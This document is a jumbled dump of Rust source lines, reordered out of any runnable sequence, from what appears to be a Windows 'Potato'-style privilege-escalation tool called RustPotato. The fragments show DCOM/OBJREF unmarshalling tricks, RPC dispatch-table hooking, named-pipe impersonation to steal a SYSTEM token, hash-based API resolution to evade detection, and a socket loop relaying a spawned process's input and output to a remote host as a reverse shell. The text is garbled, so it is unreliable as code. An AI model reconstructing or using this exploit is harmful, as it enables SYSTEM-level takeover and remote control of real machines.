    
        
            
                
                    
                        
                            
                                    
                                            _e
                                            return false
                                        )
                                        .set_token(my_primary_token as 
                                        >= IntegrityLevel::SystemIntegrity
                                        >= SecurityImpersonationLevel::Impersonation
                                        Err(_e) => {
                                        _print!(
                                        my_primary_token as usize
                                        return None
                                        token.sid.unwrap().to_username().unwrap()
                                        }
                                    )
                                    Err(_e) => {
                                    Error::last_os_error()
                                    _print!(
                                    false // Stop searching
                                    is_find_system_token = true
                                    let mut system_identity_guard = system_identity.lock().unwrap()
                                    let my_primary_token = match token.duplicate_token_ex() {
                                    system_identity_guard
                                    true // Continue searching
                                    }
                                )
                                .ok()
                                .write_all(
                                Error::last_os_error()
                                _print!(
                                break
                                match OpenOptions::new().write(true).open(
                                put_token(
                                unsafe {
                                unsafe { ntdll().nt_close.run(token_handle) }
                                {
                                }
                                } else {
                            )
                            // Pass the token to the user-provided callback
                            == winapi::shared::winerror::ERROR_PIPE_CONNECTED
                            > process_token_node.impersonation_level
                            Err(_) => {
                            Error::last_os_error()
                            FILE_SHARE_READ 
                            GENERIC_READ 
                            None
                            Some(())
                            _print!(
                            as 
                            break
                            buffer.as_ptr().add(bytes_written as usize) as 
                            buffer.as_ptr().add(total_sent as usize) as 
                            if callback(token.clone()) {
                            if result != 0 {
                            let mut is_find_system_token = false
                            let mut stream =
                            let result = RevertToSelf()
                            nt_status
                            pipe_server_thread.thread().unpark()
                            self.server_pipe.encode_utf16().chain(Some(0)).collect()
                            stream
                            stream.flush().ok()
                            }
                            } else {
                            })
                        )
                        ) {
                        ))
                        // Convert the pipe name to a wide string
                        // Open the named pipe to signal termination
                        // Write each UTF-16 character to the memory
                        >= Some(SecurityImpersonationLevel::Impersonation)
                        Err(_e) => {
                        Err(e) => {
                        LocalFree(security_descriptor as 
                        Ok(_) => {
                        Ok(out) => {
                        _print!(
                        break
                        bytes_written 
                        command = Some(args[i 
                        core::str::from_utf8_unchecked(core::slice::from_raw_parts(
                        false => {
                        host = Some(args[i 
                        i 
                        if ImpersonateNamedPipeClient(pipe_handle) != 0 {
                        if let Some(token) = ProcessToken::new(
                        if pipe_handle != BAD_HANDLE {
                        if sent == -1 {
                        if status != 0 {
                        let mut io_status_block: IoStatusBlock = IoStatusBlock::new()
                        let offset = fmt_string_offset_table_ptr.add(i as usize)
                        let offset = i as usize 
                        let pipe_handle = CreateFileW(
                        let sent = (winsock().send)(
                        let server_pipe_wide: Vec<u16> =
                        let status = ntdll().nt_write_file.run(
                        level = Some(SecurityImpersonationLevel::Impersonation)
                        lpSecurityDescriptor: security_descriptor as 
                        match args[i 
                        match create_security_descriptor(security_descriptor_string) {
                        nt_status
                        ntdll().nt_close.run(new_token)
                        ntdll().nt_open_process_token.run(
                        offset 
                        process_token_node.close()
                        ptr::write(pdsa_new_bindings.add(offset) as 
                        put_token(
                        r
                        return
                        return None
                        return ssn
                        security_quality_of_service: 
                        server_pipe.encode_utf16().chain(Some(0)).collect()
                        ssn 
                        string_binding: StringBinding {
                        tokens[i] = process_token
                        total_sent 
                        unsafe { dll_base.offset(
                        unsafe { ntdll().nt_close.run(dup_handle) }
                        }
                        } else {
                    )
                    .add(self.fmt_string_offset_table[0] as usize 
                    .collect()
                    .encode_utf16()
                    .flat_map(u16::to_le_bytes)
                    .map(
                    .proc_string
                    // Attempt to send a termination signal to the pipe server
                    // Convert server pipe name to wide string
                    // Create security attributes
                    // Create security descriptor
                    // Create the named pipe
                    // Duplicate the token into an impersonation token.
                    // Ensure the token is not restricted
                    // Match either by hash or by name.
                    // Pass the token to the user-provided callback
                    // Send the stdout data back to the remote server
                    // Wait for the thread to complete execution
                    // Write the received data to the stdin pipe of the child process
                    Error::last_os_error()
                    LocalFree(security_descriptor as 
                    None
                    PROCESS_DUP_HANDLE 
                    _print!(
                    as 
                    break
                    buffer.as_mut_ptr() as 
                    dll_content.as_ptr().add(first_match) as 
                    dual_string_array: DualStringArray {
                    fmt_string_offset_table_ptr as usize
                    for ch in endpoint.encode_utf16() {
                    handle_entry.handle_value as 
                    i -= shift as usize
                    if !NT_SUCCESS(nt_status) {
                    if !process_token.is_restricted {
                    if callback(token.clone()) {
                    if connected
                    if hash == dbj2_hash(api_name_str.as_bytes()) as usize {
                    if i 
                    if nt_status == 0 {
                    if pipe_handle == BAD_HANDLE {
                    interface.unwrap().as_raw() as 
                    let api_name_addr =
                    let api_name_len = get_cstr_len(api_name_addr as _)
                    let api_name_str = unsafe {
                    let mut bytes_written = 0
                    let mut object_attributes = ObjectAttributes {
                    let mut sa = SECURITY_ATTRIBUTES {
                    let mut sqos = SecurityQualityOfService {
                    let mut token_handle = std::ptr::null_mut()
                    let mut total_sent = 0
                    let nt_status = ntdll().nt_duplicate_token.run(
                    let nt_status = unsafe {
                    let pipe_handle: 
                    let security_attributes = SECURITY_ATTRIBUTES {
                    let server_pipe_wide: Vec<u16> =
                    level = Some(SecurityImpersonationLevel::Delegation)
                    match pipe_server_thread.join() {
                    match result {
                    ntdll().nt_close.run(new_token)
                    ntdll().nt_close.run(pipe_handle)
                    offset 
                    pdsa_new_bindings.add(2) as 
                    process_token.close()
                    result.push(handle_entry)
                    return
                    return Err(nt_get_last_error())
                    return None
                    rpc_dispatch_table.dispatch_table_count
                    rpc_server_interface.dispatch_table as usize
                    rpc_server_interface.interpreter_info as usize
                    rpc_server_interface_ptr as usize
                    security_quality_of_service: 
                    self.dispatch_table_ptr as usize
                    self.proc_string as usize
                    self.use_protseq_function_param_count
                    status
                    unsafe {
                    unsafe { ntdll().nt_close.run(process_handle.unwrap()) }
                    while bytes_written < bytes_received as u32 {
                    while total_sent < io_status_block_read.information {
                    {
                    }
                    } else {
                    })
                )
                ) {
                -1isize as 
                .as_ref()
                .clone()
                .decode(objref_string)
                .encode_utf16()
                .flat_map(u16::to_le_bytes)
                .map(
                .map_err(
                .ok()
                .unwrap()
                .unwrap_or_else(
                // AF_INET
                // Assign the newly created binding structure to the output pointer
                // Attempt to duplicate the token with Delegation level.
                // Check if the function's address matches the runtime function's address.
                // Duplicate the token into an impersonation token.
                // Execute the trigger's logic
                // Exit the loop on unhandled errors
                // Extract and store pointers for later use
                // Failed to retrieve the RID pointer.
                // Free the current buffer and retry with a larger size
                // Indicate failure due to invalid state or missing function pointer
                // Initialize the binding structure
                // Locate the 
                // Log an error if the system token is unavailable
                // Mark the hook as no longer active
                // No sub-authorities found in the SID.
                // Open the process to query its tokens
                // Populate dispatch table with function pointers
                // Populate format string offset table
                // Replace the token if conditions are met
                // Restore the original function pointer in the dispatch table
                // Retrieve pointers to key structures
                // Retrieve the first function pointer from the dispatch table
                // Retrieve the number of parameters for the first function
                // Retrieve the raw pointer from the unmarshalled interface
                // Return empty result if the layout size is zero
                // Store the trigger in the context
                // Write entry size metadata
                Arc::clone(self.system_identity.as_ref().unwrap())
                CoUnmarshalInterface(
                CreateProcessWithTokenW
                Err(_) => {
                Error::last_os_error()
                GENERIC_EXECUTE 
                None
                None => {
                PeekNamedPipe
                Self {
                Self::new()
                Some(())
                Some(ppv)
                Standard {
                _ => {
                _print!(
                as 
                break
                buffer.as_mut_ptr() as 
                cnt 
                continue
                core::mem::transmute(core::ptr::null::<core::ffi::c_void>())
                crate::utils::GUID {
                entrie_size 
                for endpoint in 
                handle_entry.handle_value as 
                handle_info_ptr as 
                handle_info_size 
                if !NT_SUCCESS(nt_status) {
                if !process_handle.is_none() {
                if bytes_received > 0 {
                if error_code != 10035 {
                if function_address == begin_address {
                if h.is_some() 
                if let Some(pipe_server_thread) = thread_lock.take() {
                if let Some(token) = ProcessToken::new(
                if nt_status == 0 {
                if process_token_node.impersonation_level == process_token.impersonation_level
                if read_result == 0 
                if self.unmashal_trigger.is_none() {
                if shift != -1 {
                ip_addr = sockaddr_in.sin_addr.s_addr
                j 
                last_pid = handle_pid as i32
                let _ = $y
                let bytes_received =
                let dispatch_entry = self.dispatch_table_ptr as 
                let error_code = (winsock().wsa_get_last_error)()
                let fmt_string_offset_table_ptr = midl_server_info.fmt_string_offset
                let function_address = unsafe { 
                let midl_server_info =
                let mut io_status_block_read: IoStatusBlock = IoStatusBlock::new()
                let mut new_token: 
                let mut object_attributes = ObjectAttributes {
                let mut offset = 4
                let mut sqos = SecurityQualityOfService {
                let nt_status = ntdll().nt_duplicate_token.run(
                let ordinal = unsafe { 
                let ppv: 
                let read_result = ntdll().nt_read_file.run(
                let rpc_dispatch_table =
                let rpc_server_interface = 
                let rpc_server_interface_ptr =
                let shift = table[text[i] as usize]
                let sockaddr_in = 
                matches.push(i)
                module_size
                pattern.write(
                principal_name
                process_handle = get_process_handle(
                ptr::write(
                ptr::write(pdsa_new_bindings as 
                return
                return -1
                return Err(nt_get_last_error())
                return None
                return Ok(self.token_handle)
                return result
                security_quality_of_service: 
                self.address
                self.dispatch_table = (0..rpc_dispatch_table.dispatch_table_count)
                self.dispatch_table_ptr = midl_server_info.dispatch_table as 
                self.dispatch_table_ptr as usize
                self.fmt_string_offset_table = (0..rpc_dispatch_table.dispatch_table_count)
                self.hash
                self.is_hook = false
                self.number
                self.proc_string = midl_server_info.proc_string
                self.unmashal_trigger = Some(trigger)
                self.unmashal_trigger.as_ref().unwrap().trigger()
                self.use_protseq_delegate as usize
                self.use_protseq_function_param_count = 
                self.use_protseq_function_ptr = self.dispatch_table[0]
                unsafe {
                {
                }
                } else {
                })
            $(
            $crate::libc_println!($($arg)
            $syscall = core::mem::transmute::<
            (ntdll().ldr_load_dll)(
            (winsock().closesocket)(sock)
            (winsock().wsa_cleanup)()
            )
            )])
            .as_ref()
            .chain(Some(0))
            .collect()
            .encode_wide()
            .into_owned()
            .nt_wait_for_single_object
            .ok()
            .process_environment_block
            .process_heap
            .to_string_lossy()
            .unwrap()
            .write_u16::<byteorder::LittleEndian>(num_entries)
            .write_u16::<byteorder::LittleEndian>(security_offset)
            .write_u16::<byteorder::LittleEndian>(self.authn_svc)
            .write_u16::<byteorder::LittleEndian>(self.authz_svc)
            .write_u16::<byteorder::LittleEndian>(self.tower_id as u16)
            .write_u32::<byteorder::LittleEndian>(ObjRefType::Standard as u32)
            .write_u32::<byteorder::LittleEndian>(Self::SIGNATURE)
            .write_u32::<byteorder::LittleEndian>(self.flags)
            .write_u32::<byteorder::LittleEndian>(self.public_refs)
            .write_u64::<byteorder::LittleEndian>(self.oxid)
            // Acquire the lock on the pipe server thread and extract its value
            // Allocate a buffer of the required size to hold the token type information.
            // Allocate memory from the process heap
            // Allocate memory using std::alloc
            // Append the RPC GUID in little-endian format to the pattern
            // Attempt to duplicate the handle
            // Attempt to retrieve the system token from the identity
            // Break on pipe closure or other errors
            // Calculate the size of the dispatch table memory
            // Calculate the total SID length based on sub-authority count
            // Calculate the total size of the binding structure in UTF-16 encoding.
            // Call your existing SID parsing function with the byte slice
            // Cast the buffer to a SYSTEM_HANDLE_INFORMATION_EX structure
            // Cast the resolved address to the specified function signature and assign it
            // Check if the SIDs match
            // Check if the buffer size was insufficient
            // Check the minimum SID length
            // Close the token handle to release resources.
            // Compute the total memory size needed for the structure.
            // Construct a pattern to locate the 
            // Convert the display name pointer to a Rust String
            // Copy the data into the allocated memory
            // Count the number of arguments passed
            // Create a COM stream from the allocated memory
            // Define memory layout for the current buffer size
            // Define the RPC endpoints to be included in the binding structure.
            // Duplicate the token into an impersonation token.
            // Ensure the hook is active and the original function pointer is available
            // Extract the TOKEN_MANDATORY_LABEL structure from the buffer.
            // Free the allocated memory
            // Get the handle of the current process
            // If the status is not 
            // If there is data to read from the socket
            // Initial query to determine the required buffer size for the token type information.
            // Interpret the first 4 bytes of the buffer as an integer representing the token type.
            // Interpret the pointer as a byte slice
            // Iterate through the handles and collect the entries
            // Log an error if the system identity is not initialized
            // Map the RID to the corresponding IntegrityLevel.
            // Mark the server as stopped
            // Match the pattern with the text
            // Monitor the socket for incoming data
            // Open the process only once per unique PID
            // Parse the object reference (ObjRef) and construct a new ObjRef with updated details
            // Perform unmarshalling to retrieve an IUnknown interface
            // Prepare a handle for the duplicated token.
            // Prepare to use 
            // Query system information for handle details
            // Query the token again with the allocated buffer to retrieve the token type.
            // Read from the child process's stdout pipe
            // Read the module's memory content
            // Replace the first entry in the dispatch table with the hook function
            // Resolve both the System Service Number (SSN) and the address of the syscall.
            // Resolve the address of the API call using the provided hash
            // Retrieve the Relative Identifier (RID) from the SID.
            // Retrieve the current impersonation level of the token.
            // Retrieve the display name of the moniker
            // Retrieve the function's address by its ordinal
            // Retrieve the process heap to allocate memory
            // Retrieve the revision and sub-authority count
            // Return the determined or upgraded impersonation level.
            // Return the handle to the duplicated token.
            // Search the export address table.
            // Skip if the process handle is invalid
            // Skip non-token handles or restricted access handles
            // Update memory protection to allow writing
            // Use the Sunday algorithm to search for the pattern in memory
            // let revision = sid_bytes[0]
            10 => NewOrcbRPC::fun10 as 
            11 => NewOrcbRPC::fun11 as 
            12 => NewOrcbRPC::fun12 as 
            13 => NewOrcbRPC::fun13 as 
            14 => NewOrcbRPC::fun14 as 
            4 => NewOrcbRPC::fun4 as 
            5 => NewOrcbRPC::fun5 as 
            6 => NewOrcbRPC::fun6 as 
            7 => NewOrcbRPC::fun7 as 
            8 => NewOrcbRPC::fun8 as 
            9 => NewOrcbRPC::fun9 as 
            ADVAPI32_PTR = Box::into_raw(Box::new(advapi32))
            CREATE_UNICODE_ENVIRONMENT 
            Err(_) => {
            K32_PTR = Box::into_raw(Box::new(k32))
            LookupAccountSidW(
            None
            Ok(duplicated)
            Sid::from_bytes(sid_data)
            Some(())
            Some(ObjRef {
            Some(match rid {
            UnmarshalDCOM::unmarshal_object(
            Vec::new() // Return an empty vector on failure.
            WS32_PTR = Box::into_raw(Box::new(winsock))
            ]
            ])
            _ => {
            _print!(
            addr
            addr_info_ptr = addr_info.ai_next
            args[0]
            as 
            attributes 
            base_address as 
            break
            buffer
            buffer.as_mut_ptr() as 
            buffer.truncate(bytes_read as usize)
            bytes.extend(
            client_id as 
            continue
            core::ptr::null_mut() as 
            cur -= 0x20
            default_timeout
            entry_ptr as 
            exit_status
            fd_array[0] = sock
            fn address(
            fn default() -> Self {
            fn hash(
            fn new() -> Self {
            fn number(
            for endpoint in 
            for i in 0..(
            for j in 0..unsafe { (
            i 
            id_auth_value = (id_auth_value << 8) 
            if !NT_SUCCESS(nt_status) {
            if !interface.is_err() {
            if addr_info.ai_family == 2 {
            if begin_address == 0 {
            if buffer_size == 0 {
            if data.is_none() {
            if display_name.is_err() {
            if dll_content.is_empty() {
            if err == 109 {
            if handle_entry.object_type_index != 0x5 
            if handle_info_ptr.is_null() {
            if i < text.len() {
            if j == pattern.len() {
            if last_pid != handle_pid as i32 {
            if layout.is_err() {
            if let Err(_) =
            if let Ok(mut thread_lock) = self.pipe_server_thread.lock() {
            if let Some(
            if let Some(raw_token_handle) = system_identity_arc.lock().unwrap().get_token() {
            if let Some(rtl_allocate_heap) = ntdll().rtl_allocate_heap {
            if let Some(size_ref) = out_module_size {
            if let Some(trigger) = RustPotatoUnmarshalTrigger::new() {
            if level.is_none() {
            if matches.is_empty() {
            if module_base.is_null() 
            if node_sid.value == process_sid.value {
            if nt_status != STATUS_BUFFER_TOO_SMALL 
            if nt_status == 0 
            if objref_bytes.is_none() {
            if pdsa_new_bindings.is_null() {
            if peek_result != 0 
            if process_handle.is_none() {
            if process_heap.is_null() {
            if ptr.is_null() {
            if rid_ptr.is_null() {
            if select_result == -1 {
            if select_result > 0 {
            if self.is_hook 
            if sid_bytes.len() < 8 {
            if sid_ptr.is_null() {
            if status != 0 
            if status != 0 {
            if status == STATUS_INFO_LENGTH_MISMATCH {
            if sub_auth_count == 0 {
            if tmp_obj_ref_opt.is_none() {
            if token_type == TokenType::Primary as i32 {
            if ws2_win32_handle.is_null() {
            iter 
            key
            last_pid = handle_pid as i32
            let addr_info = 
            let begin_address = unsafe { (
            let com_stream =
            let data = obj_ref.to_bytes()
            let dest_size = string_length_w(source_string) 
            let dispatch_entry = self.dispatch_table_ptr as 
            let display_name = match display_name_ptr.ok() {
            let display_name_ptr = self.moniker.GetDisplayName(
            let endpoints = [
            let err = nt_get_last_error()
            let expected_length = 8 
            let handle_info = handle_info_ptr as 
            let handle_info_ptr = alloc(layout)
            let layout = Layout::array::<u8>(memory_size).unwrap()
            let layout = layout.unwrap()
            let matches = Sunday::search(
            let memory_size = entrie_size 
            let mut advapi32 = Advapi32::new()
            let mut buffer: Vec<u8> = vec![0
            let mut buffer_size = 0
            let mut bytes_available: u32 = 0
            let mut cnt: u32 = 0
            let mut dup_handle: 
            let mut duplicated: 
            let mut entrie_size = 3
            let mut fd_array = [0usize
            let mut j = 0
            let mut k32 = Kernel32::new()
            let mut level = ProcessToken::get_impersonation_level(token_handle)
            let mut module_size: usize = 0
            let mut nt_status = ntdll().nt_query_information_token.run(
            let mut object_attributes = ObjectAttributes {
            let mut old_protect: u32 = 0
            let mut pattern: Vec<u8> = Vec::new()
            let mut process_basic_info: ProcessBasicInformation = core::mem::zeroed()
            let mut ptr = std::ptr::null_mut()
            let mut read_fds = FD_SET {
            let mut region_size = std::mem::size_of::<
            let mut return_length: u32 = 0
            let mut sqos = SecurityQualityOfService {
            let mut timeout = TIMEVAL {
            let mut winsock = Winsock::new()
            let mut ws2_win32_dll_unicode = UnicodeString::new()
            let mut ws2_win32_handle: 
            let nt_status = ntdll().nt_duplicate_object.run(
            let nt_status = ntdll().nt_duplicate_token.run(
            let obj_ref = ObjRef::new(
            let objref_bytes = STANDARD
            let objref_string = display_name
            let offset = 8 
            let ordinal = ordinals[i as usize] as usize
            let pdsa_new_bindings = unsafe { alloc_zeroed(layout) as 
            let peek_result = (k32().peek_named_pipe)(
            let process = -1isize as 
            let process_heap = nt_process_heap()
            let rid = 
            let select_result = (winsock().select)(
            let server_pipe = self.server_pipe.clone()
            let sid_bytes = core::slice::from_raw_parts(ptr as 
            let sid_data = core::slice::from_raw_parts(ptr as 
            let sid_ptr = token_label.label.sid
            let standard_objref = Standard::from_reader(
            let status = ntdll().nt_protect_virtual_memory.run(
            let status = ntdll().nt_query_information_process.run(
            let status = ntdll().nt_query_system_information.run(
            let sub_auth = u32::from_le_bytes([
            let sub_auth_bytes = 
            let sub_auth_count = 
            let sub_authority_count = sid_bytes[1] as usize
            let system_identity: Arc<Mutex<WindowsIdentity>> =
            let tmp_obj_ref = tmp_obj_ref_opt.unwrap()
            let tmp_obj_ref_opt = ObjRef::from_bytes(
            let token_label = 
            let token_type = match buffer[0..4].try_into() {
            let utf16_string: Vec<u16> = dll_name.encode_utf16().chain(Some(0)).collect()
            let ws2_32_module = ws2_win32_handle as 
            level
            match args[i].as_str() {
            new_token_handle
            nt_status = ntdll().nt_query_information_token.run(
            ntdll().nt_close.run(self.token_handle)
            ntdll().nt_close.run(stdin_read)
            ntdll().nt_close.run(stdin_write)
            ntdll().nt_close.run(stdout_read)
            ntdll().nt_close.run(stdout_write)
            ntdll().nt_query_information_token.run(
            ntdll.nt_protect_virtual_memory
            object_attributes as 
            object_information_length
            old_protect
            open_options
            options
            out(reg) teb_ptr
            part5[5]
            pattern.extend_from_slice(
            println!(
            pub address: 
            reader.read_u16::<byteorder::LittleEndian>().ok()
            return (
            return (winsock().wsa_get_last_error)()
            return (winsock().wsa_get_last_error)() as u32
            return -1
            return None
            return false
            return module_base.offset(functions[ordinal] as isize) as 
            return_length
            self.buffer = ptr::null_mut()
            self.buffer = source_string as 
            self.combase_module = module_base as 
            self.impersonation_level
            self.integrity_level
            self.is_hook = true
            self.is_start = false
            self.is_start = true
            self.length = 0
            self.length = dest_size as u16
            self.maximum_length = (dest_size 
            self.maximum_length = 0
            self.network_address
            self.pipe_server_thread = Arc::new(Mutex::new(Some(std::thread::spawn(move 
            self.sid
            self.target_process_handle as usize
            self.target_process_token as usize
            self.token_elevation_type
            self.token_type
            self.username
            sid as 
            std::mem::size_of::<SystemHandleInformationEx>()
            string2 = string2.add(1)
            table[a] = -1
            table[byte as usize] = i as isize
            timeout
            tmp 
            token_handle
            tower_id: TowerProtocol::try_from(tower_id).ok()
            true
            unsafe {
            unsafe { (
            unsafe { dll_base.offset((
            value 
            while j < pattern.len() 
            wide_descriptor.as_ptr() as 
            ws2_win32_dll_unicode.init(utf16_string.as_ptr())
            wsa_get_last_error: unsafe {
            {
            }
            } else if status < 0 {
            } else {
            })
            }))))
        $(
        (
        (advapi32().create_process_with_token_w)(
        (module_base.offset(data_directory.virtual_address as isize)) as 
        (winsock().closesocket)(sock)
        (winsock().freeaddrinfo)(res)
        (winsock().wsa_cleanup)()
        )
        ) != 0
        ))
        .is_none()
        // 8-4-4-4-12 hex digits (16 bytes in total)
        // Access the Export Address Table.
        // Allocate a buffer of the required size to hold the token information.
        // Append the read bytes to the output string
        // Calculate required length for sub-authorities and validate it
        // Calculate the address of the entry at the specified index
        // Call the Windows API to convert the string to a security descriptor.
        // Capture the error if process creation fails
        // Check if the byte slice has a valid length for SID
        // Check if the handle matches the target PID or if processing all PIDs
        // Check if the operation was successful and return the process handle.
        // Check if the pipe server is running before starting the trigger
        // Check if the token is restricted.
        // Close the read/write handles for the child process
        // Combine the parts into the byte array
        // Compare the hash of the DLL name with the provided hash
        // Compare the hash of the function name with the provided hash
        // Construct the 
        // Convert identifier authority bytes to a single u64 value
        // Convert the descriptor string to a wide string (UTF-16).
        // Convert the name and domain into readable strings
        // Create a bind context
        // Create a moniker
        // Create a named pipe for communication between processes.
        // Create a slice from the DLL name
        // Create a standard COM object for IUnknown
        // Create process information struct
        // Determine the token's elevation type.
        // Ensure the 
        // Ensure the impersonation level is valid.
        // Extract the elevation type as an integer.
        // Extract the token's logon SID.
        // Fill the table based on the pattern
        // Format the GUID string using the standard 8-4-4-4-12 hexadecimal format
        // Get the token's integrity level.
        // Handle only Standard OBJREF type.
        // Handle the single string argument
        // If the status is not 
        // Initial query to determine the required buffer size for the token information.
        // Initialize COM
        // Initialize SID string format with revision
        // Initialize all entries to -1
        // Inizializza la libreria ntdll
        // Interpret the first 4 bytes of the buffer as an integer representing the token type.
        // Interpret the impersonation level from the retrieved data.
        // Interpret the retrieved buffer as a TokenUser structure.
        // Main loop to handle communication between the remote server and the local process
        // Map the 
        // Map the integer to the corresponding TokenElevationType enum.
        // Map the token type value to the corresponding enum variant.
        // Move to the next module in the list
        // Ottieni il riferimento statico alla struttura NtDll
        // Parse each part of the GUID according to the GUID format:
        // Parse each sub-authority (32-bit values in little-endian format)
        // Parse the SID from the token user structure and return it as a Sid object.
        // Parse the components of the GUID
        // Parse the key-value options
        // Resolve LdrLoadDll
        // Resolve the SID to its corresponding name and domain
        // Retrieve the Exception Directory.
        // Retrieve the token type (Primary or Impersonation).
        // Retrieve the username associated with the token.
        // Return None if the calculated entry pointer is null
        // Return None if the handle info pointer is null
        // Return the newly created GUID with the formatted string
        // Run with parsed options
        // Run with the provided command-line string
        // SAFETY: buffer is valid and points to a TOKEN_GROUPS structure
        // Safely read and return the handle entry at the calculated address
        // Safety: This is safe because the struct $name does not contain any non-thread-safe data.
        // Set the OBJ_INHERIT flag if handle inheritance is requested
        // Set the initialization flag to true.
        // Set the socket to non-blocking mode
        // Setup process startup info (redirect standard handles)
        // Stampa i dettagli delle funzioni
        // Stampa intestazione
        // Traverse the runtime function table.
        // Use the existing helper to retrieve the token information
        // Use the provided security descriptor
        // Validate OBJREF signature.
        // Validate critical components of the context
        // Validate required arguments
        // Validate that the GUID is in the correct format (8-4-4-4-12)
        // Validate that the byte slice has the correct length for a GUID
        0
        0..=9 => '0' as u16 
        10..=15 => 'a' as u16 
        Advapi32 {
        ClientId {
        FILE_SHARE_READ 
        FILE_SYNCHRONOUS_IO_NONALERT 
        GENERIC_READ 
        GUID { value: value }
        IoStatusBlock {
        Kernel32 {
        LargeInteger {
        NtDll {
        ObjRef {
        ObjectAttributes {
        Ok(GUID { value: guid_string })
        Ok(bytes)
        ProcessInformation {
        RustPotatoContext {
        SecurityBinding {
        Self::fun(p10 as 
        Self::fun(p11 as 
        Self::fun(p12 as 
        Self::fun(p2 as 
        Self::fun(p3 as 
        Self::fun(p4 as 
        Self::fun(p5 as 
        Self::fun(p6 as 
        Self::fun(p7 as 
        Self::fun(p8 as 
        Self::fun(p9 as 
        Sid::from_ptr(token_user.user.sid)
        Some(())
        Some(DualStringArray {
        Some(RustPotatoUnmarshalTrigger {
        Some(SecurityBinding {
        Some(Self {
        Some(Sid { value })
        Some(Standard {
        Some(StringBinding {
        Some(buffer)
        Some(buffer_size)
        Some(bytes)
        Some(std::ptr::read(
        StartupInfoW {
        UnicodeString {
        Winsock {
        _p0: 
        _p10: 
        _p11: 
        _p1: 
        _p2: 
        _p3: 
        _p4: 
        _p5: 
        _p6: 
        _p7: 
        _p8: 
        _p9: 
        _print!(
        apc_context: 
        apc_routine: 
        asm!(
        assert!(
        base_address: 
        buffer: 
        byte_offset: 
        bytes
        bytes.extend(
        bytes.extend_from_slice(
        bytes[0..4].copy_from_slice(
        bytes[10..16].copy_from_slice(
        bytes[4..6].copy_from_slice(
        bytes[6..8].copy_from_slice(
        bytes[8..10].copy_from_slice(
        client_id: 
        cur = buffer[iter]
        cursor.read_exact(
        default_timeout: 
        event: 
        existing_token_handle: 
        file_handle: 
        for 
        for a in 0..Self::ALPHA_BET {
        for i in 0.. {
        for i in 0..sub_authority_count {
        handle: 
        handle_info.inherit = (flags 
        handle_info.protect_from_close = (flags 
        hints.ai_family = 2
        hints.ai_socktype = 1
        hsh = ((hsh << 5).wrapping_add(hsh)) 
        if !INIT_ADVAPI32.load(Ordering::Acquire) {
        if !INIT_K32.load(Ordering::Acquire) {
        if !INIT_WS32.load(Ordering::Acquire) {
        if !NT_SUCCESS(nt_status) {
        if !source_string.is_null() {
        if !success {
        if GLOBAL_CONTEXT.set(Arc::new(self.clone())).is_err() {
        if ReadProcessMemory(
        if buffer_opt.is_none() {
        if buffer_size == 0 {
        if bytes.len() != 16 {
        if bytes.len() < 8 
        if bytes.len() < 8 {
        if bytes_read == 0 {
        if c.is_empty() {
        if character == 0 {
        if cur == 0 {
        if cur >= ('a' as u8) {
        if dbj2_hash(dll_name_str.as_bytes()) != 0x1edab0ed {
        if entry_ptr.is_null() {
        if export_directory_rva == 0 {
        if flags 
        if function_hash as u32 == dbj2_hash(name_slice) {
        if host.is_none() 
        if hr.is_err() {
        if input_arg.is_empty() {
        if ioctl_result != 0 {
        if let Some(global_context) = GLOBAL_CONTEXT.get() {
        if let Some(principal_name) = 
        if let Some(system_identity_arc) = 
        if module_hash == dbj2_hash(dll_name_slice) {
        if nt_status != STATUS_BUFFER_TOO_SMALL 
        if ok != 0 {
        if parts.len() != 5 {
        if ptr.is_null() {
        if result != 0 {
        if result == 0 {
        if result {
        if rva == 0 {
        if self.combase_module.is_null() {
        if self.dispatch_table.is_empty()
        if self.is_hook 
        if self.is_start {
        if signature != Self::SIGNATURE {
        if status != 0 {
        if unsafe { (
        impl Default for $name {
        impl NtSyscall for $name {
        init_advapi32_funcs()
        init_kernel32_funcs()
        init_ntdll_funcs()
        init_winsock_funcs()
        io_status_block: 
        ip_addr
        iter 
        key: 
        let address_of_functions =
        let address_of_name_ordinals =
        let address_of_names =
        let authn_svc = reader.read_u16::<byteorder::LittleEndian>().ok()
        let authz_svc = reader.read_u16::<byteorder::LittleEndian>().ok()
        let bind_ctx = unsafe { CreateBindCtx(0).ok() }
        let buffer = buffer_opt.unwrap()
        let bytes_read = io_status_block_read.information
        let character = reader.read_u16::<byteorder::LittleEndian>().ok()
        let dll_base = unsafe { (
        let dll_buffer_ptr = (
        let dll_length = (
        let dll_name = unsafe { dll_base.offset((
        let dll_name_len = get_cstr_len(dll_name as _)
        let dll_name_slice = core::slice::from_raw_parts(dll_buffer_ptr as 
        let dll_name_str = unsafe {
        let domain_string = OsString::from_wide(
        let dos_header = dll_base as 
        let dual_string_array = DualStringArray::from_reader(reader)
        let elevation_type = match buffer[0..4].try_into() {
        let ent = unsafe { (next as 
        let entry_ptr = handle_info_ptr.add(
        let export_directory = unsafe { dll_base.offset(export_directory_rva as isize) }
        let export_directory_rva =
        let flags = cursor.read_u32::<byteorder::LittleEndian>().ok()
        let flags = reader.read_u32::<byteorder::LittleEndian>().ok()
        let guid = GUID::from_bytes(
        let guid_string = format!(
        let handle_pid = handle_entry.unique_process_id as u32
        let handles = list_system_handles()
        let hex_digit = ((pipe_id >> shift) 
        let hex_digit = ((process_id >> shift) 
        let hostname_cstr = CString::new(hostname).unwrap()
        let identifier_authority = 
        let impersonation_level = ProcessToken::ensure_impersonation_level(token_handle)
        let input_arg = 
        let integrity_level = ProcessToken::get_token_integrity_level(token_handle)
        let ipid = GUID::from_bytes(
        let is_restricted = ProcessToken::is_token_restricted(token_handle)
        let level = match buffer[0..4].try_into() {
        let logon_sid = ProcessToken::get_logon_sid(token_handle)
        let moniker = unsafe { CreateObjrefMoniker(
        let mut addr_info_ptr = res
        let mut buf = vec![0u8
        let mut buffer = [0u8
        let mut buffer: Vec<u8> = vec![0
        let mut buffer_size =
        let mut buffer_size = 0
        let mut bytes = [0u8
        let mut bytes = vec![]
        let mut bytes_read = 0
        let mut cmdline_utf16: Vec<u16> = c.encode_utf16().chain(Some(0)).collect()
        let mut command: Option<String> = None
        let mut cursor = Cursor::new(bytes)
        let mut domain = [0u16
        let mut domain_size = 256
        let mut guid_buf = [0u8
        let mut hints: AddrInfo = zeroed()
        let mut host: Option<String> = None
        let mut i = 0
        let mut i = 1
        let mut id_auth_value = 0u64
        let mut io_status_block_read: IoStatusBlock = IoStatusBlock::new()
        let mut ip_addr: u32 = 0
        let mut matches = Vec::new()
        let mut name = [0u16
        let mut name_size = 256
        let mut nonblocking: u32 = 1
        let mut ntdll = NtDll::new()
        let mut port: Option<u16> = None
